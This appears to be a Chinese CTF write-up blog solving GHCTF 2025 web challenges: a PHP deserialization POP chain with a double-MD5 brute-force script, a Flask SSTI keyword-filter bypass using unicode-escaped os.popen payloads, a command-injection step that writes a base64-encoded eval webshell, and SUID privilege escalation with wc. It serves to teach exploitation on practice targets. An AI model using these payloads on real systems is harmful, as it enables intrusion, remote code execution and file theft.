<p><font style="color:rgb(89,89,89);">34</font><font style="color:rgb(38,38,38);">再接着源码审计可以看到在 Samurai 这个类中出现了不可访问的⽅法 </font><font style="color:rgb(38,38,38);background-color:#D8DAD9;">add()</font><font style="color:rgb(38,38,38);"> ；此时⾃然就会触 </font></p>
<p><font style="color:rgb(38,38,38);">发 </font><font style="color:rgb(38,38,38);background-color:#D8DAD9;">__call()</font><font style="color:rgb(38,38,38);"> 函数。</font></p>
<p><img src="1742031448186-1a669cac-ae88-40ac-a827-ad32cc1ed2e6.png" loading="lazy"></p>
<p>我们观察到该函数为魔术魔⽅ __toString() ；那么我们就继续想如何才能触发这个 __toString</p>
<p>() 函数呢？在将对象当作字符串使⽤时就会触发 __toString（） ；所以此时我们就需要寻找有哪个</p>
<p>对象被当作字符串进⾏调⽤了。</p>
<p>继续审计发现在 CherryBlossom 类中出现了将对象 fruit1 当作字符串进⾏使⽤的操作</p>
<p><img src="1742031483342-cd42b4ab-acdb-4345-a057-9801056265e0.png" loading="lazy"></p>
<p><font style="color:rgb(38,38,38);">⾄此整条pop链已经⾮常的清晰了</font></p>
<pre><code class="language-php">__destruct -&gt; __toString -&gt; __call -&gt;__invoke() -&gt;__get
</code></pre>
<p><font style="color:rgb(38,38,38);">也就是</font></p>
<pre><code class="language-php">CherryBlossom&#123;__destruct()&#125; --&gt; Samurai&#123;__toString()&#125; --&gt; Warlord&#123;__call
()&#125; --&gt; Philosopher&#123;__invoke()&#125; --&gt; Mystery&#123;__get()&#125;
</code></pre>
<p><font style="color:rgb(38,38,38);">但是此时我们发现要实现这⼀整条 pop 链还有⼀步没有绕过；我们发现在最后⼀步 </font><font style="color:rgb(38,38,38);">__get() </font><font style="color:rgb(38,38,38);">函数的触 </font></p>
<p><font style="color:rgb(38,38,38);">发时需要满⾜。</font></p>
<pre><code class="language-php">public function __invoke() &#123;
       if (md5(md5($this-&gt;fruit11)) == 666) &#123;
           return $this-&gt;fruit10-&gt;hey;
       &#125;
 &#125;
</code></pre>
<h3 id="双重MD5"><a href="#双重MD5" class="headerlink" title="双重MD5"></a>双重MD5</h3><p><font style="color:rgb(38,38,38);">此时利⽤到的是双重md5绕过： </font></p>
<pre><code class="language-python"># -*- coding: utf-8 -*-
# 运⾏: python2 md5.py &quot;666&quot; 0
import multiprocessing
import hashlib
import random
import string
import sys
CHARS = string.ascii_letters + string.digits
def cmp_md5(substr, stop_event, str_len, start=0, size=20):
    global CHARS
    while not stop_event.is_set():
        rnds = &#39;&#39;.join(random.choice(CHARS) for _ in range(size))
    md5 = hashlib.md5(rnds)
    value = md5.hexdigest()
    if value[start: start + str_len] == substr:
        # print rnds
        # stop_event.set()
    # 碰撞双md5
        md5 = hashlib.md5(value)
    if md5.hexdigest()[start: start + str_len] == substr:
        print rnds + &quot;=&gt;&quot; + value + &quot;=&gt;&quot; + md5.hexdigest() + &quot;\n&quot;
    stop_event.set()
if __name__ == &#39;__main__&#39;:
    substr = sys.argv[1].strip()
    start_pos = int(sys.argv[2]) if len(sys.argv) &gt; 1 else 0
    str_len = len(substr)
    cpus = multiprocessing.cpu_count()
    stop_event = multiprocessing.Event()
    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,
                                                               stop_event,
                                                               str_len, start_pos))
                 for i in range(cpus)]
    for p in processes:
        p.start()
    for p in processes:
        p.join()
</code></pre>
<h3 id="反序列化之遍历⽂件⽬录类"><a href="#反序列化之遍历⽂件⽬录类" class="headerlink" title="反序列化之遍历⽂件⽬录类"></a>反序列化之遍历⽂件⽬录类</h3><pre><code class="language-php">&lt;?php
  error_reporting(0);
class CherryBlossom
&#123;
  public $fruit1;
  public $fruit2;
  function __destruct()
  &#123;
    echo $this-&gt;fruit1;
  &#125;
  public function __toString()
  &#123;
    $newFunc = $this-&gt;fruit2;
    return $newFunc();
  &#125;
&#125;
class Mystery
&#123;
  public $GlobIterator=&quot;/*&quot;;
  public function __get($arg1)
  &#123;
    array_walk($this, function ($day1, $day2) &#123;
      $day3 = new $day2($day1);
      foreach ($day3 as $day4) &#123;
        echo($day4 . &#39;&lt;br&gt;&#39;);
      &#125;
    &#125;);
  &#125;
&#125;
class Philosopher
&#123;
  public $fruit10;
public $fruit11=&quot;rSYwGEnSLmJWWqkEARJp&quot;;
public function __invoke()
  &#123;
    if (md5(md5($this-&gt;fruit11)) == 666) &#123;
      return $this-&gt;fruit10-&gt;hey;
    &#125;
  &#125;
&#125;
$b=new CherryBlossom();
$b-&gt;fruit1=new CherryBlossom();
$b-&gt;fruit1-&gt;fruit2=new Philosopher();
$b-&gt;fruit1-&gt;fruit2-&gt;fruit10=new Mystery();
$c=serialize($b);
echo $c;
</code></pre>
<p><img src="1742031823033-c13c1bc4-6f2d-47eb-987a-7686d5fdf237.png" loading="lazy"></p>
<p><img src="1741762974733-00c8656f-211f-4f06-b422-88175970fc47.png" loading="lazy"></p>
<p>爆出了flag的位置</p>
<h3 id="反序列化之读取⽂件类"><a href="#反序列化之读取⽂件类" class="headerlink" title="反序列化之读取⽂件类"></a>反序列化之读取⽂件类</h3><p><font style="color:rgb(38,38,38);">此时成功遍历⽂件⽬录后我们直接读取⽂件即可</font></p>
<pre><code class="language-php">&lt;?php
  error_reporting(0);
class CherryBlossom
&#123;
  public $fruit1;
  public $fruit2;
  function __destruct()
  &#123;
    echo $this-&gt;fruit1;
  &#125;
  public function __toString()
  &#123;
    $newFunc = $this-&gt;fruit2;
    return $newFunc();
  &#125;
&#125;
class Mystery
&#123;
  public $SplFileObject=&quot;/flag44545615441084&quot;;
  public function __get($arg1)
  &#123;
    array_walk($this, function ($day1, $day2) &#123;
      $day3 = new $day2($day1);
      foreach ($day3 as $day4) &#123;
        echo($day4 . &#39;&lt;br&gt;&#39;);
      &#125;
    &#125;);
  &#125;
&#125;
class Philosopher
&#123;
  public $fruit10;   
  public $fruit11=&quot;rSYwGEnSLmJWWqkEARJp&quot;;
public function __invoke()
  &#123;
    if (md5(md5($this-&gt;fruit11)) == 666) &#123;
      return $this-&gt;fruit10-&gt;hey;
    &#125;
  &#125;
&#125;
$b=new CherryBlossom();
$b-&gt;fruit1=new CherryBlossom();
$b-&gt;fruit1-&gt;fruit2=new Philosopher();
$b-&gt;fruit1-&gt;fruit2-&gt;fruit10=new Mystery();
$c=serialize($b);
echo $c;
</code></pre>
<p><img src="1741763706926-5a0492d4-930b-49b8-a737-89c8c70110bd.png" loading="lazy"></p>
<h1 id="GHCTF-2025-upload-SSTI"><a href="#GHCTF-2025-upload-SSTI" class="headerlink" title="[GHCTF 2025]upload?SSTI!"></a>[GHCTF 2025]upload?SSTI!</h1><h2 id="题目链接-4"><a href="#题目链接-4" class="headerlink" title="题目链接"></a>题目链接</h2><p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/6529">https://www.nssctf.cn/problem/6529</a></p>
<h2 id="题解（wp）-2"><a href="#题解（wp）-2" class="headerlink" title="题解（wp）"></a>题解（wp）</h2><p><font style="color:rgb(82, 95, 127);">#</font><font style="color:rgb(82, 95, 127);"> </font><font style="color:rgb(82, 95, 127);">upload?SSTI!</font></p>
<pre><code class="language-python">import os
import re

from flask import Flask, request, jsonify,render_template_string,send_from_directory, abort,redirect
from werkzeug.utils import secure_filename
import os
from werkzeug.utils import secure_filename

app = Flask(__name__)

# 配置信息
UPLOAD_FOLDER = &#39;static/uploads&#39;  # 上传文件保存目录
ALLOWED_EXTENSIONS = &#123;&#39;txt&#39;, &#39;log&#39;, &#39;text&#39;,&#39;md&#39;,&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;&#125;
MAX_CONTENT_LENGTH = 16 * 1024 * 1024  # 限制上传大小为 16MB

app.config[&#39;UPLOAD_FOLDER&#39;] = UPLOAD_FOLDER
app.config[&#39;MAX_CONTENT_LENGTH&#39;] = MAX_CONTENT_LENGTH

# 创建上传目录（如果不存在）
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
def is_safe_path(basedir, path):
    return os.path.commonpath([basedir,path])

def contains_dangerous_keywords(file_path):
    dangerous_keywords = [&#39;_&#39;, &#39;os&#39;, &#39;subclasses&#39;, &#39;__builtins__&#39;, &#39;__globals__&#39;,&#39;flag&#39;,]

    with open(file_path, &#39;rb&#39;) as f:
        file_content = str(f.read())

        for keyword in dangerous_keywords:
            if keyword in file_content:
                return True  # 找到危险关键字，返回 True

    return False  # 文件内容中没有危险关键字
def allowed_file(filename):
    return &#39;.&#39; in filename and \
    filename.rsplit(&#39;.&#39;, 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def upload_file():
    if request.method == &#39;POST&#39;:
        # 检查是否有文件被上传
        if &#39;file&#39; not in request.files:
            return jsonify(&#123;&quot;error&quot;: &quot;未上传文件&quot;&#125;), 400

        file = request.files[&#39;file&#39;]

        # 检查是否选择了文件
        if file.filename == &#39;&#39;:
            return jsonify(&#123;&quot;error&quot;: &quot;请选择文件&quot;&#125;), 400

        # 验证文件名和扩展名
        if file and allowed_file(file.filename):
            # 安全处理文件名
            filename = secure_filename(file.filename)
            # 保存文件
            save_path = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], filename)
            file.save(save_path)

            # 返回文件路径（绝对路径）
            return jsonify(&#123;
                &quot;message&quot;: &quot;File uploaded successfully&quot;,
                &quot;path&quot;: os.path.abspath(save_path)
            &#125;), 200
        else:
            return jsonify(&#123;&quot;error&quot;: &quot;文件类型错误&quot;&#125;), 400

    # GET 请求显示上传表单（可选）
    return &#39;&#39;&#39;
    &lt;!doctype html&gt;
    &lt;title&gt;Upload File&lt;/title&gt;
    &lt;h1&gt;Upload File&lt;/h1&gt;
    &lt;form method=post enctype=multipart/form-data&gt;
      &lt;input type=file name=file&gt;
      &lt;input type=submit value=Upload&gt;
    &lt;/form&gt;
    &#39;&#39;&#39;

@app.route(&#39;/file/&lt;path:filename&gt;&#39;)
def view_file(filename):
    try:
        # 1. 过滤文件名
        safe_filename = secure_filename(filename)
        if not safe_filename:
            abort(400, description=&quot;无效文件名&quot;)

        # 2. 构造完整路径
        file_path = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], safe_filename)

        # 3. 路径安全检查
        if not is_safe_path(app.config[&#39;UPLOAD_FOLDER&#39;], file_path):
            abort(403, description=&quot;禁止访问的路径&quot;)

        # 4. 检查文件是否存在
        if not os.path.isfile(file_path):
            abort(404, description=&quot;文件不存在&quot;)

        suffix=os.path.splitext(filename)[1]
        print(suffix)
        if suffix==&quot;.jpg&quot; or suffix==&quot;.png&quot; or suffix==&quot;.gif&quot;:
            return send_from_directory(&quot;static/uploads/&quot;,filename,mimetype=&#39;image/jpeg&#39;)

        if contains_dangerous_keywords(file_path):
            # 删除不安全的文件
            os.remove(file_path)
            return jsonify(&#123;&quot;error&quot;: &quot;Waf!!!!&quot;&#125;), 400

        with open(file_path, &#39;rb&#39;) as f:
            file_data = f.read().decode(&#39;utf-8&#39;)
        tmp_str = &quot;&quot;&quot;&lt;!DOCTYPE html&gt;
        &lt;html lang=&quot;zh&quot;&gt;
        &lt;head&gt;
            &lt;meta charset=&quot;UTF-8&quot;&gt;
            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
            &lt;title&gt;查看文件内容&lt;/title&gt;
        &lt;/head&gt;
        &lt;body&gt;
            &lt;h1&gt;文件内容：&#123;name&#125;&lt;/h1&gt;  &lt;!-- 显示文件名 --&gt;
            &lt;pre&gt;&#123;data&#125;&lt;/pre&gt;  &lt;!-- 显示文件内容 --&gt;

            &lt;footer&gt;
                &lt;p&gt;&amp;copy; 2025 文件查看器&lt;/p&gt;
            &lt;/footer&gt;
        &lt;/body&gt;
        &lt;/html&gt;
        &quot;&quot;&quot;.format(name=safe_filename, data=file_data)

        return render_template_string(tmp_str)

    except Exception as e:
        app.logger.error(f&quot;文件查看失败: &#123;str(e)&#125;&quot;)
        abort(500, description=&quot;文件查看失败:&#123;&#125; &quot;.format(str(e)))

# 错误处理（可选）
@app.errorhandler(404)
def not_found(error):
    return &#123;&quot;error&quot;: error.description&#125;, 404

@app.errorhandler(403)
def forbidden(error):
    return &#123;&quot;error&quot;: error.description&#125;, 403

if __name__ == &#39;__main__&#39;:
    app.run(&quot;0.0.0.0&quot;,debug=False)
</code></pre>
<p><font style="color:rgb(82, 95, 127);">下载附件，发现是源码，开始代码审计</font></p>
<p><font style="color:rgb(82, 95, 127);">审完发现，重点在于这一块</font></p>
<pre><code class="language-python">@app.route(&#39;/file/&lt;path:filename&gt;&#39;)
def view_file(filename):
    try:
        # 1. 过滤文件名
        safe_filename = secure_filename(filename)
        if not safe_filename:
            abort(400, description=&quot;无效文件名&quot;)

        # 2. 构造完整路径
        file_path = os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], safe_filename)

        # 3. 路径安全检查
        if not is_safe_path(app.config[&#39;UPLOAD_FOLDER&#39;], file_path):
            abort(403, description=&quot;禁止访问的路径&quot;)

        # 4. 检查文件是否存在
        if not os.path.isfile(file_path):
            abort(404, description=&quot;文件不存在&quot;)

        suffix=os.path.splitext(filename)[1]
        print(suffix)
        if suffix==&quot;.jpg&quot; or suffix==&quot;.png&quot; or suffix==&quot;.gif&quot;:
            return send_from_directory(&quot;static/uploads/&quot;,filename,mimetype=&#39;image/jpeg&#39;)

        if contains_dangerous_keywords(file_path):
            # 删除不安全的文件
            os.remove(file_path)
            return jsonify(&#123;&quot;error&quot;: &quot;Waf!!!!&quot;&#125;), 400
</code></pre>
<p><font style="color:rgb(82, 95, 127);">在 &#x2F;file 下才能触发上传文件，还发现有关键词过滤</font></p>
<pre><code class="language-python">def contains_dangerous_keywords(file_path):
    dangerous_keywords = [&#39;_&#39;, &#39;os&#39;, &#39;subclasses&#39;, &#39;__builtins__&#39;, &#39;__globals__&#39;,&#39;flag&#39;,]
</code></pre>
<p>简单的关键词过滤，字符串拼接就能过<br>先尝试触发一下 ssti<br>payload:49<br>访问 &#x2F;file&#x2F;<filename>，成功触发 7*7，说明注入点确实在这儿</filename></p>
<p><img src="image-20250316161453834.png" loading="lazy"></p>
<p>测试一下能不能获取类</p>
<pre><code class="language-python">payload: &#123;&#123;’’|attr(”class”)&#125;&#125;
</code></pre>
<p>应为下划线被过滤，所以用 | attr 代替<br>“”.<strong>class</strong> &#x3D;&#x3D; “”|attr(“class”)<br>再次访问</p>
<p><img src="image-20250316161808503.png" loading="lazy"></p>
<p>并没有回显，继续尝试 lipsum</p>
<pre><code class="language-python">payload : &#123;&#123;lipsum&#125;&#125;
</code></pre>
<p><img src="image-20250316162139913.png" loading="lazy"></p>
<p>思路明确了，直接尝试构造<br>payload :</p>
<pre><code class="language-python"> &#123;&#123;lipsum|attr(”globals”).get(”os”).popen(”ls”).read()&#125;&#125;
</code></pre>
<p>但是在过滤中不但过滤了关键词 globals 和 os 还过滤了下划线，所以我们尝试使用 unicode 编码绕过<br>所以最终 payload 为</p>
<pre><code class="language-python">&#123;&#123;((((lipsum|attr(“\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f”))|attr(“\u0067\u0065\u0074”)(“o””s”))|attr(“\u0070\u006f\u0070\u0065\u006e”)(“ls”))|attr(“\u0072\u0065\u0061\u0064”)())&#125;&#125;
</code></pre>
<p><img src="image-20250316162209165.png" loading="lazy"></p>
<p>除了 unicode 编码外，关键字过滤还能使用字符串拼接绕过</p>
<pre><code class="language-python">也可以不使用+号
os == &#39;o&#39;&#39;s&#39;
也可以不使用+号
os == &#39;o&#39;&#39;s&#39;
</code></pre>
<h1 id="GHCTF-2025-GetShell"><a href="#GHCTF-2025-GetShell" class="headerlink" title="[GHCTF 2025]GetShell"></a>[GHCTF 2025]GetShell</h1><h2 id="题目链接-5"><a href="#题目链接-5" class="headerlink" title="题目链接"></a>题目链接</h2><p><a target="_blank" rel="noopener" href="http://node1.anna.nssctf.cn:28578/">http://node1.anna.nssctf.cn:28578/</a></p>
<h2 id="题解（wp）-3"><a href="#题解（wp）-3" class="headerlink" title="题解（wp）"></a>题解（wp）</h2><p>开启靶场，发现给了源码</p>
<pre><code class="language-php">&lt;?php
highlight_file(__FILE__);

class ConfigLoader &#123;
    private $config;

    public function __construct() &#123;
        $this-&gt;config = [
            &#39;debug&#39; =&gt; true,
            &#39;mode&#39; =&gt; &#39;production&#39;,
            &#39;log_level&#39; =&gt; &#39;info&#39;,
            &#39;max_input_length&#39; =&gt; 100,
            &#39;min_password_length&#39; =&gt; 8,
            &#39;allowed_actions&#39; =&gt; [&#39;run&#39;, &#39;debug&#39;, &#39;generate&#39;]
        ];
    &#125;

    public function get($key) &#123;
        return $this-&gt;config[$key] ?? null;
    &#125;
&#125;

class Logger &#123;
    private $logLevel;

    public function __construct($logLevel) &#123;
        $this-&gt;logLevel = $logLevel;
    &#125;

    public function log($message, $level = &#39;info&#39;) &#123;
        if ($level === $this-&gt;logLevel) &#123;
            echo &quot;[LOG] $message\n&quot;;
        &#125;
    &#125;
&#125;

class UserManager &#123;
    private $users = [];
    private $logger;

    public function __construct($logger) &#123;
        $this-&gt;logger = $logger;
    &#125;

    public function addUser($username, $password) &#123;
        if (strlen($username) &lt; 5) &#123;
            return &quot;Username must be at least 5 characters&quot;;
        &#125;

        if (strlen($password) &lt; 8) &#123;
            return &quot;Password must be at least 8 characters&quot;;
        &#125;

        $this-&gt;users[$username] = password_hash($password, PASSWORD_BCRYPT);
        $this-&gt;logger-&gt;log(&quot;User $username added&quot;);
        return &quot;User $username added&quot;;
    &#125;

    public function authenticate($username, $password) &#123;
        if (isset($this-&gt;users[$username]) &amp;&amp; password_verify($password, $this-&gt;users[$username])) &#123;
            $this-&gt;logger-&gt;log(&quot;User $username authenticated&quot;);
            return &quot;User $username authenticated&quot;;
        &#125;
        return &quot;Authentication failed&quot;;
    &#125;
&#125;

class StringUtils &#123;
    public static function sanitize($input) &#123;
        return htmlspecialchars($input, ENT_QUOTES, &#39;UTF-8&#39;);
    &#125;

    public static function generateRandomString($length = 10) &#123;
        return substr(str_shuffle(str_repeat($x = &#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;, ceil($length / strlen($x)))), 1, $length);
    &#125;
&#125;

class InputValidator &#123;
    private $maxLength;

    public function __construct($maxLength) &#123;
        $this-&gt;maxLength = $maxLength;
    &#125;

    public function validate($input) &#123;
        if (strlen($input) &gt; $this-&gt;maxLength) &#123;
            return &quot;Input exceeds maximum length of &#123;$this-&gt;maxLength&#125; characters&quot;;
        &#125;
        return true;
    &#125;
&#125;

class CommandExecutor &#123;
    private $logger;

    public function __construct($logger) &#123;
        $this-&gt;logger = $logger;
    &#125;

    public function execute($input) &#123;
        if (strpos($input, &#39; &#39;) !== false) &#123;
            $this-&gt;logger-&gt;log(&quot;Invalid input: space detected&quot;);
            die(&#39;No spaces allowed&#39;);
        &#125;

        @exec($input, $output);
        $this-&gt;logger-&gt;log(&quot;Result: $input&quot;);
        return implode(&quot;\n&quot;, $output);
    &#125;
&#125;

class ActionHandler &#123;
    private $config;
    private $logger;
    private $executor;

    public function __construct($config, $logger) &#123;
        $this-&gt;config = $config;
        $this-&gt;logger = $logger;
        $this-&gt;executor = new CommandExecutor($logger);
    &#125;

    public function handle($action, $input) &#123;
        if (!in_array($action, $this-&gt;config-&gt;get(&#39;allowed_actions&#39;))) &#123;
            return &quot;Invalid action&quot;;
        &#125;

        if ($action === &#39;run&#39;) &#123;
            $validator = new InputValidator($this-&gt;config-&gt;get(&#39;max_input_length&#39;));
            $validationResult = $validator-&gt;validate($input);
            if ($validationResult !== true) &#123;
                return $validationResult;
            &#125;

            return $this-&gt;executor-&gt;execute($input);
        &#125; elseif ($action === &#39;debug&#39;) &#123;
            return &quot;Debug mode enabled&quot;;
        &#125; elseif ($action === &#39;generate&#39;) &#123;
            return &quot;Random string: &quot; . StringUtils::generateRandomString(15);
        &#125;

        return &quot;Unknown action&quot;;
    &#125;
&#125;

if (isset($_REQUEST[&#39;action&#39;])) &#123;
    $config = new ConfigLoader();
    $logger = new Logger($config-&gt;get(&#39;log_level&#39;));

    $actionHandler = new ActionHandler($config, $logger);
    $input = $_REQUEST[&#39;input&#39;] ?? &#39;&#39;;
    echo $actionHandler-&gt;handle($_REQUEST[&#39;action&#39;], $input);
&#125; else &#123;
    $config = new ConfigLoader();
    $logger = new Logger($config-&gt;get(&#39;log_level&#39;));
    $userManager = new UserManager($logger);

    if (isset($_POST[&#39;register&#39;])) &#123;
        $username = $_POST[&#39;username&#39;];
        $password = $_POST[&#39;password&#39;];

        echo $userManager-&gt;addUser($username, $password);
    &#125;

    if (isset($_POST[&#39;login&#39;])) &#123;
        $username = $_POST[&#39;username&#39;];
        $password = $_POST[&#39;password&#39;];

        echo $userManager-&gt;authenticate($username, $password);
    &#125;

    $logger-&gt;log(&quot;No action provided, running default logic&quot;);
&#125; [LOG] No action provided, running default logic
</code></pre>
<p><font style="color:rgb(38,38,38);">命令执⾏点：此时的类名已经提示得很明显了：CommandExecutor</font></p>
<pre><code class="language-php">class CommandExecutor &#123;
    private $logger;

    public function __construct($logger) &#123;
        $this-&gt;logger = $logger;
    &#125;

    public function execute($input) &#123;
        if (strpos($input, &#39; &#39;) !== false) &#123;
            $this-&gt;logger-&gt;log(&quot;Invalid input: space detected&quot;);
            die(&#39;No spaces allowed&#39;);
        &#125;

        @exec($input, $output);
        $this-&gt;logger-&gt;log(&quot;Result: $input&quot;);
        return implode(&quot;\n&quot;, $output);
    &#125;
&#125;
</code></pre>
<p><font style="color:rgb(38,38,38);">接下来继续审计会发现有⼀个前置条件</font></p>
<pre><code class="language-php">if ($action === &#39;run&#39;) &#123;
            $validator = new InputValidator($this-&gt;config-&gt;get(&#39;max_input_length&#39;));
            $validationResult = $validator-&gt;validate($input);
            if ($validationResult !== true) &#123;
                return $validationResult;
            &#125;

            return $this-&gt;executor-&gt;execute($input);
</code></pre>
<p><font style="color:rgb(38,38,38);">只有当action&#x3D;run的情况下才会执⾏。那这就很好构造了：</font></p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a><font style="color:rgb(38,38,38);">getshell</font></h3><pre><code class="language-php">?action=run&amp;input=echo%09PD9waHAgZXZhbCgkX1BPU1RbMF0pOz8%2b|base64%09-d%3Es
hell.php
</code></pre>
<p><img src="1742110248326-9029419c-b8df-4dcf-b73c-d4e59cc6897b.png" loading="lazy"></p>
<p><img src="1742110292105-889ffac7-3f93-451c-8da9-aedc7d20faa9.png" loading="lazy"></p>
<p>直接蚁剑连接</p>
<p><img src="1742110415741-d0664a5d-c56f-4588-a008-656b40c253f0.png" loading="lazy"></p>
<p><img src="1742110458398-dde4091b-f7a1-4922-8ada-d188362e9f59.png" loading="lazy"></p>
<p>尝试读取flag</p>
<p><img src="1742110533854-eb00a2e2-7b37-4e26-b311-3c8f6c535939.png" loading="lazy"></p>
<p>打开发现什么都没有！！！！</p>
<p>😱😱😱</p>
<p>明明有大小打开却发现什么都没有</p>
<p>《flag失踪案》</p>
<p>真相只有一个🕵️</p>
<p>回到根目录，有一个docker的配置文件</p>
<p><img src="1742110684450-de6eb184-da12-4bd8-823b-30e4b3192f47.png" loading="lazy"></p>
<pre><code class="language-shell">#!/bin/sh

# Get the user
user=$(ls /home)

# Check the environment variables for the flag and assign to INSERT_FLAG
# 需要注意，以下语句会将FLAG相关传递变量进行覆盖，如果需要，请注意修改相关操作
if [ &quot;$DASFLAG&quot; ]; then
    INSERT_FLAG=&quot;$DASFLAG&quot;
    export DASFLAG=no_FLAG
    DASFLAG=no_FLAG
elif [ &quot;$FLAG&quot; ]; then
    INSERT_FLAG=&quot;$FLAG&quot;
    export FLAG=no_FLAG
    FLAG=no_FLAG
elif [ &quot;$GZCTF_FLAG&quot; ]; then
    INSERT_FLAG=&quot;$GZCTF_FLAG&quot;
    export GZCTF_FLAG=no_FLAG
    GZCTF_FLAG=no_FLAG
else
    INSERT_FLAG=&quot;flag&#123;TEST_Dynamic_FLAG&#125;&quot;
fi

# 将FLAG写入文件 请根据需要修改
echo $INSERT_FLAG | tee /flag

chmod 700 /flag

exec apache2-foreground
</code></pre>
<p>注意这一行</p>
<p>chmod 700 &#x2F;flag</p>
<p>它的作用是确保只有文件所有者（如root）可读写，阻止其他用户或服务（如Apache的<code>www-data</code>用户）直接访问。</p>
<p>那就很明了了，直接提权便是</p>
<h3 id="Suid提权"><a href="#Suid提权" class="headerlink" title="Suid提权"></a><font style="color:rgb(38,38,38);">Suid提权</font></h3><p><font style="color:rgb(38,38,38);">所谓suid就是，你本来是www-data的权限，但是当你执⾏有 </font></p>
<p><font style="color:rgb(38,38,38);">suid权限的⽂件时，你会暂时拥有这⽂件所有者的权限（⽐如root）。</font></p>
<p><font style="color:rgb(38,38,38);">关于Suid提权的文章</font></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11981">https://xz.aliyun.com/news/11981</a></p>
<p><img src="1742111741730-fafc41ac-9272-443a-9203-9f2f17a202e4.png" loading="lazy"></p>
<pre><code class="language-shell">find / -user root -perm -4000 -print 2&gt;/dev/null
result:
(www-data:/var/www/html) $ find / -user root -perm -4000 -print 2&gt;/dev/nul
l
/var/www/html/wc
/bin/umount
/bin/mount
/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
</code></pre>
<p><font style="color:rgb(38,38,38);">有一个wc文件有点可疑</font></p>
<p><font style="color:rgb(38,38,38);">去找找这个文件是否能提权</font></p>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
<p><img src="1742111901549-6bbd1783-e9c8-42e1-8f45-ccddc2985221.png" loading="lazy"></p>
<p>可以进行提权，按照文档来做</p>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/wc/#suid">https://gtfobins.github.io/gtfobins/wc/#suid</a></p>
<p><img src="1742111988479-affd37b8-8c6e-4f71-839f-88123bdc9cb0.png" loading="lazy"></p>
<pre><code class="language-shell">/var/www/html/wc --files0-from &quot;$LFILE&quot;
</code></pre>
<p><img src="1742112064301-cd58df66-eda2-4bd0-97c5-18c715ab6aca.png" loading="lazy"></p>
<p>解出flag</p>
<h1 id="GHCTF-2025-Escape！"><a href="#GHCTF-2025-Escape！" class="headerlink" title="[GHCTF 2025]Escape！"></a>[GHCTF 2025]Escape！</h1><h2 id="题目链接-6"><a href="#题目链接-6" class="headerlink" title="题目链接"></a>题目链接</h2><p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/6537">https://www.nssctf.cn/problem/6537</a></p>
<h2 id="题解（wp）-4"><a href="#题解（wp）-4" class="headerlink" title="题解（wp）"></a>题解（wp）</h2><p><img src="1742522958050-224f8bd1-5f7b-475b-a022-3ed96e72432a.png" loading="lazy"></p>
<p>题目给了源码</p>
<p><img src="1742523019194-a1946d0b-5721-4313-b9ec-ca309bcaa15d.png" loading="lazy"></p>
<p>源码🤢🤢🤢🤢！！！！</p>
<p>dashboard.php</p>
<pre><code class="language-php">&lt;?php
ini_set(&#39;display_errors&#39;, 0);
error_reporting(0);
include &quot;class.php&quot;;
function checkSignedCookie($cookieName = &#39;user_token&#39;, $secretKey = &#39;fake_secretkey&#39;) &#123;
    // 获取 Cookie 内容
    if (isset($_COOKIE[$cookieName])) &#123;
        $token = $_COOKIE[$cookieName];

        // 解码并分割数据和签名
        $decodedToken = base64_decode($token);
        list($serializedData, $providedSignature) = explode(&#39;|&#39;, $decodedToken);

        // 重新计算签名
        $calculatedSignature = hash_hmac(&#39;sha256&#39;, $serializedData, $secretKey);

        // 比较签名是否一致
        if ($calculatedSignature === $providedSignature) &#123;
            // 签名验证通过，返回序列化的数据
            return $serializedData;  // 反序列化数据
        &#125; else &#123;
            // 签名验证失败
            return false;
        &#125;
    &#125;
    return false;  // 如果没有 Cookie
&#125;

// 示例：验证并读取 Cookie
$userData = checkSignedCookie();
if ($userData) &#123;
    #echo $userData;
    $user=unserialize($userData);
    #var_dump($user);
    if($user-&gt;isadmin)&#123;
        $tmp=file_get_contents(&quot;tmp/admin.html&quot;);

        echo $tmp;

        if($_POST[&#39;txt&#39;]) &#123;
        	$content = &#39;&lt;?php exit; ?&gt;&#39;;
		$content .= $_POST[&#39;txt&#39;];
		file_put_contents($_POST[&#39;filename&#39;], $content);
        &#125;
    &#125;
    else&#123;
        $tmp=file_get_contents(&quot;tmp/admin.html&quot;);
        echo $tmp;
    	if($_POST[&#39;txt&#39;]||$_POST[&#39;filename&#39;])&#123;
        echo &quot;&lt;h1&gt;权限不足，写入失败&lt;h1&gt;&quot;;
&#125;
    &#125;
&#125; else &#123;
    echo &#39;token验证失败&#39;;
&#125;
</code></pre>
<p>来看这一行</p>
<pre><code class="language-php">$userData = checkSignedCookie();
if ($userData) &#123;
    #echo $userData;
    $user=unserialize($userData);
    #var_dump($user);
    if($user-&gt;isadmin)&#123;
        $tmp=file_get_contents(&quot;tmp/admin.html&quot;);

        echo $tmp;

        if($_POST[&#39;txt&#39;]) &#123;
        	$content = &#39;&lt;?php exit; ?&gt;&#39;;
		$content .= $_POST[&#39;txt&#39;];
		file_put_contents($_POST[&#39;filename&#39;], $content);
        &#125;
    &#125;
    else&#123;
        $tmp=file_get_contents(&quot;tmp/admin.html&quot;);
        echo $tmp;
    	if($_POST[&#39;txt&#39;]||$_POST[&#39;filename&#39;])&#123;
        echo &quot;&lt;h1&gt;权限不足，写入失败&lt;h1&gt;&quot;;
&#125;
</code></pre>
<p>这里很明显有一个文件写入的操作，只要绕过<?php exit; ?>即可执行命令</p>
<p>但是这个文件写入又必须是admin，不然就会提示没有权限</p>
